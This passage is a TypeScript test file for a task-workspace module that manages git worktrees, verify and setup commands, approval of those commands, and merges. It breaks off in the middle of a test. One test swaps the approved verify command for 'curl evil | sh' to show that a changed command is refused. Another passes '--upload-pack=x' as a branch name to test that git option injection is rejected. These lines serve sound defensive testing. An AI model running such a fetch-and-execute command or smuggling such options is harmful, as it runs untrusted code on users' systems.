// M64: the Workspace module through its own interface: the board and the jobs in memory,
// git real in a temporary repository. (M66 moves the lifecycle's rules here.)
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { BoardTask } from "../lib/board.ts";
import type { RoostEvent } from "../lib/events.ts";
import type { DispatchArgs } from "../lib/protocol.ts";
import { roostHome } from "../lib/paths.ts";
import { verifyLogPath } from "../lib/project-config.ts";
import { makeTaskWorktree, withMergeLock } from "../lib/task-git.ts";
import type { Clock } from "../lib/clock.ts";
import { type BoardWho, createWorkspaces, PREPARED_MS } from "../lib/workspace.ts";
import { manualClock } from "./support/clock.ts";

const dirs: string[] = [];
let home: string;
beforeEach(() => {
	home = mkdtempSync(join(tmpdir(), "roost-ws-home-"));
	dirs.push(home);
	process.env.PI_ROOST_HOME = home;
	process.env.PI_ROOST_CONFIG_DIR = home;
});
afterEach(() => {
	for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
	delete process.env.PI_ROOST_HOME;
	delete process.env.PI_ROOST_CONFIG_DIR;
});

const git = (cwd: string, ...args: string[]) => execFileSync("git", ["-C", cwd, "-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", ...args], { encoding: "utf8" }).trim();

/** A repository on main; `project` is committed as .roost/project.json (verify, setup, verifyTimeout, maxRounds). */
function repo(project?: object): string {
	const d = realpathSync(mkdtempSync(join(tmpdir(), "roost-ws-")));
	dirs.push(d);
	git(d, "init", "-q", "-b", "main");
	writeFileSync(join(d, "a.txt"), "a\n");
	if (project) {
		mkdirSync(join(d, ".roost"));
		writeFileSync(join(d, ".roost", "project.json"), JSON.stringify(project));
	}
	git(d, "add", ".");
	git(d, "commit", "-q", "-m", "init");
	return d;
}

const person: BoardWho = { who: "user", whoId: null, sessionId: null, concierge: false, project: null };

/** The module with its board and jobs in memory: what it recorded, what it dispatched. */
/** A clock the test moves: its timers fire when it passes them. */
function world(clock?: Clock, gate?: Promise<void>, board?: Map<number, BoardTask>) {
	const tasks = board ?? new Map<number, BoardTask>();
	const events: Omit<RoostEvent, "seq" | "at">[] = [];
	const dispatched: DispatchArgs[] = [];
	const live = new Set<string>();
	const commands: { id: string; verifyOf?: number; setupOf?: number; running: boolean }[] = [];
	const stopped: string[] = [];
	const removed: string[] = [];
	/** What each dispatch was given, with its meta: a command job has launch.kind "shell" and meta.verifyOf or meta.setupOf. */
	const jobsLog: { id: string; launch: DispatchArgs; meta?: { verifyOf?: number; setupOf?: number } }[] = [];
	/** What the module told a Task's holder, and whether the holder takes messages. */
	const told: { to: string; from: string; body: string }[] = [];
	const opened: number[] = [];
	const holder = { takesMessages: true };
	let saves = 0;
	const ws = createWorkspaces({
		board: {
			tasks,
			save: () => void saves++,
			record: (e) => void events.push(e),
			push: () => {},
			taskEvent: (a, why, t, extra) => void events.push({ kind: "task", id: a.whoId ?? "", name: a.who, who: a.who, whoId: a.whoId, why, text: `#${t.id} ${t.title}${extra ? `: ${extra}` : ""}` }),
			tellOwner: async (owner, from, body) => {
				told.push({ to: owner.id, from, body });
				return holder.takesMessages;
			},
			tellOpened: (t) => void opened.push(t.id),
		},
		jobs: {
			dispatch: async (launch, meta) => {
				if (gate) await gate;
				dispatched.push(launch);
				const id = `j${dispatched.length}`;
				jobsLog.push({ id, launch, ...(meta ? { meta } : {}) });
				live.add(id);
				return { id, name: launch.name ?? id };
			},
			stop: async (id) => {
				stopped.push(id);
				live.delete(id);
			},
			remove: async (id) => void removed.push(id),
			live: (id) => live.has(id),
			commandJobs: () => commands,
		},
		conciergeMayAct: () => false,
		conciergeLaunch: (l) => l,
		...(clock ? { clock } : {}),
	});
	const stages = () => events.filter((e) => e.why === "stage").map((e) => e.text);
	/** The command jobs dispatched so far, newest last. */
	const shells = (kind: "verifyOf" | "setupOf" = "verifyOf") => jobsLog.filter((j) => j.launch.kind === "shell" && j.meta?.[kind] !== undefined);
	return { ws, tasks, events, dispatched, live, commands, stopped, removed, stages, jobsLog, told, opened, holder, shells, saves: () => saves };
}

/** A tick, to see that something did NOT happen after a command ended (the queue left alone). */
const tick = () => new Promise((r) => setTimeout(r, 30));
/** What the module does after a command ends (its job removed, the queue pumped, a session dispatched): waited for, not timed. */
const eventually = (check: () => void) => vi.waitFor(check, { timeout: 5000, interval: 10 });

const newTask = (id: number, project: string): BoardTask => ({ id, title: "write b", detail: null, state: "open", after: [], by: { who: "user", whoId: null }, at: 0, owner: null, claimedAt: null, doneAt: null, result: null, assigned: null, project, waiting: [] });

describe("M64: the Workspace module, in process", () => {
	it("a Task from its start to its merge: working, in review (no Verify command), merged into Base; the worktree goes once its session is gone", async () => {
		const r = repo();
		const { ws, tasks, dispatched, live, stages } = world();
		const t = newTask(1, r);
		tasks.set(1, t);
		// M65: the module makes the worktree (prepare), the start goes into it
		const w = (await ws.act(person, t, "prepare", {})).workspace!;
		expect(w).toMatchObject({ baseRef: "main", branch: expect.stringMatching(/^roost\/t1-write-b-/) });
		expect(existsSync(w.path)).toBe(true);
		const launch: DispatchArgs = { cwd: w.path, sessionFile: join(w.path, "s.jsonl"), command: ["pi"], env: {}, name: "writer", origin: "dispatch" };
		const started = await ws.act(person, t, "start", { launch });
		expect(started.job).toEqual({ id: "j1", name: "writer" });
		expect(dispatched).toHaveLength(1);
		expect(t).toMatchObject({ state: "claimed", owner: { id: "j1" }, workspace: { stage: "working", branch: w.branch } });

		// the session commits and says done: no verify command in the repository, so review
		writeFileSync(join(w.path, "b.txt"), "b\n");
		git(w.path, "add", "b.txt");
		git(w.path, "commit", "-q", "-m", "b");
		const session: BoardWho = { who: "writer", whoId: "j1", sessionId: "j1", concierge: false, project: r };
		await ws.done(session, t, "wrote b");
		expect(t.workspace).toMatchObject({ stage: "review" });
		expect(t.result).toBe("wrote b");

		// its session gone, the Person merges: into main, the worktree and branch removed
		live.delete("j1");
		const merged = await ws.act(person, t, "merge", {});
		expect(merged.note).toContain("merged into main");
		expect(t).toMatchObject({ state: "done", workspace: { stage: "merged" } });
		expect(git(r, "log", "--format=%s", "main")).toContain("b");
		expect(existsSync(w.path)).toBe(false);
		expect(stages()).toEqual([expect.stringContaining("working"), expect.stringContaining("in review"), expect.stringContaining("merging"), expect.stringContaining("merged")]);
	});

	it("one action on a Workspace at a time: a second while the first runs is a conflict", async () => {
		const r = repo();
		const { ws, tasks } = world();
		const t = newTask(1, r);
		tasks.set(1, t);
		const w = (await ws.act(person, t, "prepare", {})).workspace!;
		const launch: DispatchArgs = { cwd: w.path, sessionFile: join(w.path, "s.jsonl"), command: ["pi"], env: {}, name: "writer", origin: "dispatch" };
		const args = { launch };
		const first = ws.act(person, t, "start", args);
		await expect(ws.act(person, t, "start", args)).rejects.toMatchObject({ code: "conflict" });
		await first;
	});

	it("drop: refused while its Workspace merges (before anything else is looked at), and the board is not touched", async () => {
		const { ws } = world();
		const t: BoardTask = { ...newTask(1, "/nowhere"), state: "done", workspace: { path: "/nowhere/w", branch: "roost/t1-x-0000", baseRef: "main", baseSha: "a".repeat(40), stage: "merging", note: null } };
		let marked = false;
		await expect(ws.drop(t, () => void (marked = true))).rejects.toMatchObject({ code: "conflict" });
		expect(marked).toBe(false);
	});

	it("settle: a Verify a restart cut short goes to review, a setup to failed; command jobs no run reports to are stopped and removed", async () => {
		const { ws, tasks, commands, stopped, removed } = world();
		const ws1 = { path: "/r/w1", branch: "roost/t1-a-0000", baseRef: "main", baseSha: "a".repeat(40) };
		tasks.set(1, { ...newTask(1, "/r"), workspace: { ...ws1, stage: "verifying", note: "running sh check.sh" } });
		tasks.set(2, { ...newTask(2, "/r"), workspace: { ...ws1, branch: "roost/t2-b-0000", stage: "working", note: "setting up: npm ci" } });
		tasks.set(3, { ...newTask(3, "/r"), workspace: { ...ws1, branch: "roost/t3-c-0000", stage: "working", note: null } });
		commands.push({ id: "v1", verifyOf: 1, running: true }, { id: "s2", setupOf: 2, running: false });
		ws.settle();
		expect(tasks.get(1)!.workspace).toMatchObject({ stage: "review", note: "not verified (interrupted)" });
		expect(tasks.get(2)!.workspace).toMatchObject({ stage: "failed", note: "setup interrupted: /tasks start again" });
		expect(tasks.get(3)!.workspace).toMatchObject({ stage: "working", note: null });
		await new Promise((r) => setTimeout(r, 20));
		expect(stopped).toEqual(["v1"]);
		expect(removed.sort()).toEqual(["s2", "v1"]);
	});

	it("M65: a start not prepared for is refused; a refused start removes the worktree prepared for it; prepare again holds the same one", async () => {
		const r = repo();
		const { ws, tasks } = world();
		const t = newTask(1, r);
		tasks.set(1, t);
		const launch = (cwd: string): DispatchArgs => ({ cwd, sessionFile: join(cwd, "s.jsonl"), command: ["pi"], env: {}, name: "writer", origin: "dispatch" });
		await expect(ws.act(person, t, "start", { launch: launch(r) })).rejects.toThrow(/not prepared/);
		const w = (await ws.act(person, t, "prepare", {})).workspace!;
		expect((await ws.act(person, t, "prepare", {})).workspace?.path).toBe(w.path);
		// a launch outside its worktree: refused, the worktree and its branch gone
		await expect(ws.act(person, t, "start", { launch: launch(r) })).rejects.toMatchObject({ code: "bad_request" });
		expect(existsSync(w.path)).toBe(false);
		expect(git(r, "branch", "--list", w.branch)).toBe("");
		expect(t.workspace).toBeUndefined();
	});

	it("M65: a worktree prepared and never started is removed after PREPARED_MS", async () => {
		const r = repo();
		const { clock, advance } = manualClock();
		const { ws, tasks } = world(clock);
		const t = newTask(1, r);
		tasks.set(1, t);
		const w = (await ws.act(person, t, "prepare", {})).workspace!;
		advance(PREPARED_MS - 1);
		expect(existsSync(w.path)).toBe(true);
		advance(1);
		expect(existsSync(w.path)).toBe(false);
	});

	it("M65: its time running out while a start dispatches into it does not remove it; asking again does not extend its time", async () => {
		const r = repo();
		const { clock, advance } = manualClock();
		let open!: () => void;
		const gate = new Promise<void>((res) => (open = res));
		const { ws, tasks } = world(clock, gate);
		const t = newTask(1, r);
		tasks.set(1, t);
		const w = (await ws.act(person, t, "prepare", {})).workspace!;
		const starting = ws.act(person, t, "start", { launch: { cwd: w.path, sessionFile: join(w.path, "s.jsonl"), command: ["pi"], env: {}, name: "writer", origin: "dispatch" } });
		await new Promise((res) => setTimeout(res, 50));
		advance(PREPARED_MS);
		expect(existsSync(w.path)).toBe(true);
		open();
		await starting;
		expect(t.workspace).toMatchObject({ stage: "working", path: w.path });
		advance(PREPARED_MS);
		expect(existsSync(w.path)).toBe(true);

		// another task: prepared, asked again near its end, gone at the first one's end
		const t2 = newTask(2, r);
		tasks.set(2, t2);
		const w2 = (await ws.act(person, t2, "prepare", {})).workspace!;
		advance(PREPARED_MS - 1);
		expect((await ws.act(person, t2, "prepare", {})).workspace?.path).toBe(w2.path);
		advance(1);
		expect(existsSync(w2.path)).toBe(false);
	});

	it("M65: an existing Workspace whose worktree is on another branch is not prepared or started again", async () => {
		const r = repo();
		const { ws, tasks, live } = world();
		const t = newTask(1, r);
		tasks.set(1, t);
		const w = (await ws.act(person, t, "prepare", {})).workspace!;
		const launch: DispatchArgs = { cwd: w.path, sessionFile: join(w.path, "s.jsonl"), command: ["pi"], env: {}, name: "writer", origin: "dispatch" };
		await ws.act(person, t, "start", { launch });
		live.clear();
		git(w.path, "checkout", "-q", "-b", "elsewhere");
		await expect(ws.act(person, t, "prepare", {})).rejects.toThrow(/on elsewhere, not roost\/t1-/);
		await expect(ws.act(person, t, "start", { launch })).rejects.toThrow(/on elsewhere/);
		git(w.path, "checkout", "-q", w.branch);
		expect((await ws.act(person, t, "start", { launch })).job).toBeTruthy();
	});
});

// M66: the rules of the lifecycle, through the interface (they were socket tests in comms.test.ts).
type World = ReturnType<typeof world>;
const launchIn = (cwd: string, name = "writer"): DispatchArgs => ({ cwd, sessionFile: join(cwd, "s.jsonl"), command: ["pi"], env: {}, name, origin: "dispatch" });

/** A Task in `r`, prepared and started: its worktree, and the session that holds it (as a session says it is done). */
async function startTask(w: World, r: string, id: number, title = "write b") {
	const t = { ...newTask(id, r), title };
	w.tasks.set(id, t);
	const p = (await w.ws.act(person, t, "prepare", {})).workspace!;
	const started = await w.ws.act(person, t, "start", { launch: launchIn(p.path) });
	const session: BoardWho = { who: "writer", whoId: started.job!.id, sessionId: started.job!.id, concierge: false, project: r };
	return { t, path: p.path, branch: p.branch, job: started.job!, session };
}
function commitIn(path: string, file: string, text = "x\n", msg = "work") {
	writeFileSync(join(path, file), text);
	git(path, "add", file);
	git(path, "commit", "-q", "-m", msg);
}
/** What a person does: see the commands, then approve what was shown. */
async function approveShown(w: World, t: BoardTask) {
	const { hash } = await w.ws.act(person, t, "approve", { dry: true });
	return w.ws.act(person, t, "approve", { hash });
}
/** A Task started in `r`, one commit made and its session done: its Verify (or review) begins. */
async function finished(w: World, r: string, id: number, title = "write b") {
	const s = await startTask(w, r, id, title);
	commitIn(s.path, `f${id}.txt`);
	await w.ws.done(s.session, s.t, `did ${id}`);
	return s;
}

describe("M66: the Workspace's rules, in process", () => {
	it("a conflict stops in the task's worktree with Base untouched; abort returns it to review; back sends it to its session", async () => {
		const r = repo();
		const w = world();
		const s = await startTask(w, r, 1, "edit a");
		commitIn(s.path, "a.txt", "task\n", "task");
		await w.ws.done(s.session, s.t, "x");
		commitIn(r, "a.txt", "main\n", "main");
		const before = git(r, "rev-parse", "main");
		const c = await w.ws.act(person, s.t, "merge", {});
		expect(c.note).toMatch(/^conflict: resolve it in /);
		expect(s.t.workspace).toMatchObject({ stage: "conflict" });
		expect(s.t.workspace?.note).toContain("a.txt");
		expect(git(r, "rev-parse", "main")).toBe(before);
		expect(existsSync(join(git(s.path, "rev-parse", "--absolute-git-dir"), "MERGE_HEAD"))).toBe(true);
		await w.ws.act(person, s.t, "abort", {});
		expect(s.t.workspace).toMatchObject({ stage: "review", note: "sync aborted" });
		expect(existsSync(join(git(s.path, "rev-parse", "--absolute-git-dir"), "MERGE_HEAD"))).toBe(false);
		// abort only from a conflict
		await expect(w.ws.act(person, s.t, "abort", {})).rejects.toMatchObject({ code: "bad_request" });

		const back = await w.ws.act(person, s.t, "back", { note: "rebase onto main's a.txt" });
		expect(s.t.workspace).toMatchObject({ stage: "working", note: "sent back: rebase onto main's a.txt" });
		expect(back.note).toBe("sent back to writer");
		expect(w.told).toHaveLength(1);
		expect(w.told[0]).toMatchObject({ to: s.job.id, from: "user" });
		expect(w.told[0]!.body).toContain(`Task #1`);
		expect(w.told[0]!.body).toContain("came back from review: rebase onto main's a.txt");
		expect(w.told[0]!.body).toContain(`Work on it in ${s.path}`);
	});

	it("back: a session that takes no messages keeps the comments; with no live session the note says to start one", async () => {
		const r = repo();
		const w = world();
		const s = await finished(w, r, 1);
		await w.ws.act(person, s.t, "comment", { comment: { file: "f1.txt", line: 1, text: "rename" } });
		w.holder.takesMessages = false;
		const kept = await w.ws.act(person, s.t, "back", {});
		expect(kept.note).toContain("takes no messages: the comments stay");
		expect(s.t.workspace?.comments).toHaveLength(1);
		// no session lives: nothing is told, the comments wait for the next start
		await w.ws.done(s.session, s.t, "again");
		w.live.clear();
		const none = await w.ws.act(person, s.t, "back", {});
		expect(none.note).toContain("no session holds it");
		expect(w.told).toHaveLength(1);
		expect(s.t.workspace?.comments).toHaveLength(1);
	});

	it("a worktree off its branch is not merged (a detached HEAD's commits would be lost)", async () => {
		const r = repo();
		const w = world();
		const s = await startTask(w, r, 1, "detach me");
		commitIn(s.path, "n.txt");
		await w.ws.done(s.session, s.t, "x");
		git(s.path, "checkout", "-q", "--detach");
		const before = git(r, "rev-parse", "main");
		const m = await w.ws.act(person, s.t, "merge", {});
		expect(m.note).toContain("check out");
		expect(s.t.workspace).toMatchObject({ stage: "review" });
		expect(s.t.workspace?.note).toContain("detached HEAD");
		expect(git(r, "rev-parse", "main")).toBe(before);
		expect(git(r, "branch", "--list", s.branch)).toContain(s.branch);
	});

	it("a damaged workspace record is refused before any git runs", async () => {
		const r = repo();
		const { ws } = world();
		const damaged = (workspace: object): BoardTask => ({ ...newTask(1, r), workspace: workspace as never });
		// no path, no branch: `git -C ""` would be the daemon's own directory
		for (const action of ["commit", "merge", "abort"] as const) {
			await expect(ws.act(person, damaged({ stage: "review" }), action, {})).rejects.toMatchObject({ code: "bad_request" });
		}
		// a path that is not absolute, or not there
		const base = { branch: "roost/t1-x-0000", baseRef: "main", baseSha: "a".repeat(40), stage: "review", note: null };
		await expect(ws.act(person, damaged({ ...base, path: "relative/w" }), "commit", {})).rejects.toThrow(/is not there/);
		await expect(ws.act(person, damaged({ ...base, path: join(r, "gone") }), "merge", {})).rejects.toThrow(/is not there/);
		// a Base that is not a ref name
		const real = join(r, ".git");
		await expect(ws.act(person, damaged({ ...base, path: real, baseRef: "--upload-pack=x" }), "merge", {})).rejects.toMatchObject({ code: "bad_request" });
	});

	it("a Verify failure goes back to the session with the end of its output; at maxRounds it stops for a person; pass accepts it", async () => {
		const r = repo({ verify: "echo boom; exit 3", maxRounds: 2 });
		const w = world();
		const t0 = { ...newTask(9, r) };
		await approveShown(w, t0);
		const s = await startTask(w, r, 1, "flaky");
		commitIn(s.path, "b.txt");
		await w.ws.done(s.session, s.t, "x");
		expect(s.t.workspace).toMatchObject({ stage: "verifying", note: "running echo boom; exit 3" });
		const v1 = w.shells("verifyOf").at(-1)!;
		expect(v1.meta).toEqual({ verifyOf: 1 });
		expect(v1.launch).toMatchObject({ cwd: s.path, name: "verify #1" });
		expect(v1.launch.env).toMatchObject({ ROOST_TASK_ID: "1", ROOST_WORKTREE: s.path, ROOST_BRANCH: s.branch, ROOST_BASE: "main" });

		writeFileSync(verifyLogPath(1, 1), "building\nboom\n");
		w.ws.commandEnded(v1.id, { verifyOf: 1 }, 3);
		expect(s.t.workspace).toMatchObject({ stage: "working", note: "verify failed (exit 3), round 1 of 2", verify: { ok: false, rounds: 1, tail: "building\nboom" } });
		expect(w.told).toHaveLength(1);
		expect(w.told[0]).toMatchObject({ to: s.job.id, from: "roost" });
		expect(w.told[0]!.body).toContain("failed (exit 3)");
		expect(w.told[0]!.body).toContain("The end of its output:\n\nbuilding\nboom\n");
		await eventually(() => expect(w.removed).toContain(v1.id)); // the verify row goes once its result is recorded

		// the second try fails again: no rounds left, a person decides
		await w.ws.done(s.session, s.t, "again");
		const v2 = w.shells("verifyOf").at(-1)!;
		expect(v2.id).not.toBe(v1.id);
		writeFileSync(verifyLogPath(1, 2), "boom\n");
		w.ws.commandEnded(v2.id, { verifyOf: 1 }, 3);
		expect(s.t.workspace).toMatchObject({ stage: "failed", verify: { rounds: 2, tail: "boom" } });
		expect(s.t.workspace?.note).toBe("verify failed (exit 3): boom");
		expect(w.told).toHaveLength(1);
		await w.ws.act(person, s.t, "pass", {});
		expect(s.t.workspace).toMatchObject({ stage: "review", note: "passed by hand" });
		// pass only from failed
		await expect(w.ws.act(person, s.t, "pass", {})).rejects.toMatchObject({ code: "bad_request" });
	});

	it("a Verify failure with no live session stops for a person at once; a pass starts the count again", async () => {
		const r = repo({ verify: "check", maxRounds: 3 });
		const w = world();
		await approveShown(w, newTask(9, r));
		const s = await startTask(w, r, 1);
		commitIn(s.path, "b.txt");
		await w.ws.done(s.session, s.t, "x");
		w.live.clear();
		w.ws.commandEnded(w.shells().at(-1)!.id, { verifyOf: 1 }, 1);
		expect(s.t.workspace).toMatchObject({ stage: "failed", verify: { ok: false, rounds: 1 } });
		expect(w.told).toHaveLength(0);
		// verify by hand (from failed) starts at round 1 again, and a pass records ok
		await w.ws.act(person, s.t, "verify", {});
		expect(s.t.workspace).toMatchObject({ stage: "verifying", verify: { rounds: 0 } });
		w.ws.commandEnded(w.shells().at(-1)!.id, { verifyOf: 1 }, 0);
		expect(s.t.workspace).toMatchObject({ stage: "review", verify: { ok: true, rounds: 0 } });
		expect(s.t.workspace?.note).toMatch(/^verified: check \(/);
	});

	it("an approved setup runs in the new worktree before the session starts; a failing one stops the task", async () => {
		const r = repo({ setup: "echo set > setup-ran.txt" });
		const w = world();
		await approveShown(w, newTask(9, r));
		const t = newTask(1, r);
		w.tasks.set(1, t);
		const p = (await w.ws.act(person, t, "prepare", {})).workspace!;
		const res = await w.ws.act(person, t, "start", { launch: launchIn(p.path) });
		expect(res.job).toBeUndefined();
		expect(res.note).toContain("setting up");
		// the setup is a command job in the new worktree; no session yet
		const setup = w.shells("setupOf").at(-1)!;
		expect(setup.meta).toEqual({ setupOf: 1 });
		expect(setup.launch).toMatchObject({ cwd: p.path, name: "setup #1" });
		expect(w.dispatched.filter((l) => l.kind !== "shell")).toHaveLength(0);
		expect(t).toMatchObject({ state: "open", owner: null, workspace: { stage: "working", note: "setting up: echo set > setup-ran.txt" } });
		// until it is done a start (or a shelve) is refused
		await expect(w.ws.act(person, t, "start", { launch: launchIn(p.path) })).rejects.toThrow(/is being set up/);
		await expect(w.ws.act(person, t, "shelve", {})).rejects.toMatchObject({ code: "conflict" });
		// it ended well: the session starts
		w.ws.commandEnded(setup.id, { setupOf: 1 }, 0);
		await eventually(() => expect(w.jobsLog.some((j) => j.launch.kind !== "shell")).toBe(true));
		const session = w.jobsLog.find((j) => j.launch.kind !== "shell")!;
		expect(session.launch.cwd).toBe(p.path);
		expect(session.meta).toMatchObject({ task: { id: 1, path: p.path, branch: p.branch } });
		expect(t).toMatchObject({ state: "claimed", owner: { id: session.id }, workspace: { stage: "working" } });
		await eventually(() => expect(w.removed).toContain(setup.id));

		// a failing setup: the task stops with the end of its log
		const r2 = repo({ setup: "exit 9" });
		await approveShown(w, newTask(8, r2));
		const bad = newTask(2, r2);
		w.tasks.set(2, bad);
		const p2 = (await w.ws.act(person, bad, "prepare", {})).workspace!;
		await w.ws.act(person, bad, "start", { launch: launchIn(p2.path) });
		writeFileSync(verifyLogPath(2, 0), "npm ERR! nope\n");
		w.ws.commandEnded(w.shells("setupOf").at(-1)!.id, { setupOf: 2 }, 9);
		await eventually(() => expect(bad.workspace).toMatchObject({ stage: "failed" }));
		expect(bad.workspace?.note).toBe("setup failed (exit 9): npm ERR! nope");
		expect(bad.owner).toBeNull();
		// the session never started
		expect(w.jobsLog.filter((j) => j.launch.kind !== "shell")).toHaveLength(1);
	});

	it("a setup not approved does not run: the session starts, a note says why", async () => {
		const r = repo({ setup: "make deps" });
		const w = world();
		const s = await startTask(w, r, 1);
		expect(w.shells("setupOf")).toHaveLength(0);
		expect(s.t.workspace).toMatchObject({ stage: "working", note: "setup not run: not approved (/tasks approve)" });
	});

	it("the commands changed between showing and approving: refused", async () => {
		const r = repo({ verify: "make test" });
		const { ws } = world();
		const t = newTask(1, r);
		const shown = await ws.act(person, t, "approve", { dry: true });
		expect(shown.note).toBe("verify: make test");
		// no hash, or a stale one
		await expect(ws.act(person, t, "approve", {})).rejects.toMatchObject({ code: "conflict" });
		writeFileSync(join(r, ".roost", "project.json"), JSON.stringify({ verify: "curl evil | sh" }));
		git(r, "commit", "-qam", "swap");
		await expect(ws.act(person, t, "approve", { hash: shown.hash })).rejects.toMatchObject({ code: "conflict" });
		// nothing was approved: a Verify would not run
		const w = world();
		const s = await startTask(w, r, 2);
		commitIn(s.path, "b.txt");
		await w.ws.done(s.session, s.t, "x");
		expect(s.t.workspace?.note).toContain("/tasks approve 2");
		expect(w.shells()).toHaveLength(0);
		// shown again, the new commands can be approved
		const again = await ws.act(person, t, "approve", { dry: true });
		expect(again.note).toBe("verify: curl evil | sh");
		expect((await ws.act(person, t, "approve", { hash: again.hash })).note).toContain("approved");
	});

	it("a Verify that runs past its timeout is stopped; when it ends without a code the task fails with \"timed out\"", async () => {
		const r = repo({ verify: "sleep 30", verifyTimeout: 1, maxRounds: 1 });
		const { clock, advance } = manualClock();
		const w = world(clock);
		await approveShown(w, newTask(9, r));
		const s = await startTask(w, r, 1, "slow");
		commitIn(s.path, "b.txt");
		await w.ws.done(s.session, s.t, "x");
		const v = w.shells().at(-1)!;
		advance(999);
		expect(w.stopped).toEqual([]);
		advance(1);
		expect(w.stopped).toEqual([v.id]);
		expect(s.t.workspace?.stage).toBe("verifying"); // stopped, not yet ended
		w.ws.commandEnded(v.id, { verifyOf: 1 }, null);
		expect(s.t.workspace).toMatchObject({ stage: "failed", verify: { ok: false, rounds: 1 } });
		expect(s.t.workspace?.note).toMatch(/^verify failed \(timed out after 1s\)/);
		// even an exit 0 after the timeout is a failure
		const s2 = await startTask(w, r, 2, "slower");
		commitIn(s2.path, "c.txt");
		await w.ws.done(s2.session, s2.t, "x");
		const v2 = w.shells().at(-1)!;
		advance(1000);
		w.ws.commandEnded(v2.id, { verifyOf: 2 }, 0);
		expect(s2.t.workspace).toMatchObject({ stage: "failed" });
		expect(s2.t.workspace?.note).toContain("timed out");
	});

	it("a drop while verifying stops the Verify and says so; nothing rewrites the stage after", async () => {
		const r = repo({ verify: "sleep 30", verifyTimeout: 1, maxRounds: 1 });
		const { clock, advance } = manualClock();
		const w = world(clock);
		await approveShown(w, newTask(9, r));
		const s = await startTask(w, r, 1, "dropped while verifying");
		commitIn(s.path, "b.txt");
		await w.ws.done(s.session, s.t, "x");
		const v = w.shells().at(-1)!;
		const note = await w.ws.drop(s.t, () => void (s.t.state = "dropped"));
		expect(note).toContain("its verify was stopped");
		expect(note).toContain(s.path);
		await eventually(() => expect(w.stopped).toEqual([v.id]));
		// the timeout no longer fires, and the job's end changes nothing
		advance(5000);
		expect(w.stopped).toEqual([v.id]);
		w.ws.commandEnded(v.id, { verifyOf: 1 }, null);
		expect(s.t.workspace?.stage).toBe("verifying");
		expect(s.t.workspace?.verify).toBeUndefined();
	});

	it("a restart finds a Verify with no run: review, not verified (interrupted), a queued one too; an interrupted setup fails; the jobs left behind are stopped and removed", async () => {
		const r = repo({ verify: "check" });
		const board = new Map<number, BoardTask>();
		const first = world(undefined, undefined, board);
		await approveShown(first, newTask(9, r));
		for (const id of [1, 2, 3]) {
			const s = await startTask(first, r, id, `t${id}`);
			commitIn(s.path, `f${id}.txt`);
			await first.ws.done(s.session, s.t, "x");
		}
		expect(board.get(1)!.workspace?.stage).toBe("verifying");
		expect(board.get(3)!.workspace?.note).toBe("queued");
		// a task setting up when the daemon stopped
		const r2 = repo({ setup: "make deps" });
		await approveShown(first, newTask(8, r2));
		const st = newTask(4, r2);
		board.set(4, st);
		const p = (await first.ws.act(person, st, "prepare", {})).workspace!;
		await first.ws.act(person, st, "start", { launch: launchIn(p.path) });
		expect(st.workspace?.note).toMatch(/^setting up/);
		// the daemon restarts: a new module over the same board; the old jobs are still in its records
		const second = world(undefined, undefined, board);
		const [v1, v2] = first.shells("verifyOf");
		const setup = first.shells("setupOf").at(-1)!;
		second.commands.push({ id: v1!.id, verifyOf: 1, running: true }, { id: v2!.id, verifyOf: 2, running: false }, { id: setup.id, setupOf: 4, running: true });
		second.ws.settle();
		for (const id of [1, 2, 3]) expect(board.get(id)!.workspace).toMatchObject({ stage: "review", note: "not verified (interrupted)" });
		expect(st.workspace).toMatchObject({ stage: "failed", note: "setup interrupted: /tasks start again" });
		await eventually(() => expect(second.removed.sort()).toEqual([v1!.id, v2!.id, setup.id].sort()));
		expect(second.stopped.sort()).toEqual([v1!.id, setup.id].sort()); // only the ones still running
		// the queued one is not started: nothing in the new module runs a Verify
		expect(second.shells("verifyOf")).toHaveLength(0);
	});

	it("a branch merged into Base by hand is marked merged; dependents are told; one reset onto Base is not", async () => {
		const old = process.env.PI_ROOST_HAND_MERGE_MS;
		process.env.PI_ROOST_HAND_MERGE_MS = "0";
		try {
			const r = repo();
			const w = world();
			const a = await finished(w, r, 1, "schema");
			const next = { ...newTask(2, r), title: "after", after: [1] };
			w.tasks.set(2, next);
			const other = await finished(w, r, 3, "reset");
			w.live.clear();
			// a branch moved onto Base (reset) is not a merge of what was reviewed
			git(other.path, "reset", "-q", "--hard", "main");
			git(r, "merge", "--ff-only", "-q", a.branch);
			await w.ws.handMerges();
			expect(a.t).toMatchObject({ state: "done", workspace: { stage: "merged", note: "merged by hand" } });
			expect(w.opened).toEqual([1]);
			expect(other.t.workspace?.stage).toBe("review");
			// the dependent can be started now
			const p = (await w.ws.act(person, next, "prepare", {})).workspace!;
			expect((await w.ws.act(person, next, "start", { launch: launchIn(p.path) })).job).toBeTruthy();
		} finally {
			if (old === undefined) delete process.env.PI_ROOST_HAND_MERGE_MS;
			else process.env.PI_ROOST_HAND_MERGE_MS = old;
		}
	});

	it("not marked merged by hand: a branch committed to after its review, one whose worktree has changes, one with no commits of its own", async () => {
		const old = process.env.PI_ROOST_HAND_MERGE_MS;
		process.env.PI_ROOST_HAND_MERGE_MS = "0";
		try {
			const r = repo();
			const w = world();
			const moved = await finished(w, r, 1, "moved");
			const dirty = await finished(w, r, 2, "dirty");
			// in review with nothing committed: its tip is Base's, "in Base" from the start
			const empty = await startTask(w, r, 3, "empty");
			await w.ws.done(empty.session, empty.t, "nothing to do");
			expect(empty.t.workspace?.stage).toBe("review");
			w.live.clear();
			// moved after review: what reached Base is not what was reviewed
			commitIn(moved.path, "later.txt");
			git(r, "merge", "--no-ff", "-q", "-m", "m1", moved.branch);
			// what was reviewed reached Base, but the worktree holds changes no one has seen
			git(r, "merge", "--no-ff", "-q", "-m", "m2", dirty.branch);
			writeFileSync(join(dirty.path, "wip.txt"), "x\n");
			await w.ws.handMerges();
			expect(moved.t.workspace?.stage).toBe("review");
			expect(dirty.t.workspace?.stage).toBe("review");
			expect(empty.t.workspace?.stage).toBe("review");
			expect(w.opened).toEqual([]);
			// the changes gone, it is marked merged
			rmSync(join(dirty.path, "wip.txt"));
			await w.ws.handMerges();
			expect(dirty.t).toMatchObject({ state: "done", workspace: { stage: "merged", note: "merged by hand" } });
			expect(moved.t.workspace?.stage).toBe("review");
		} finally {
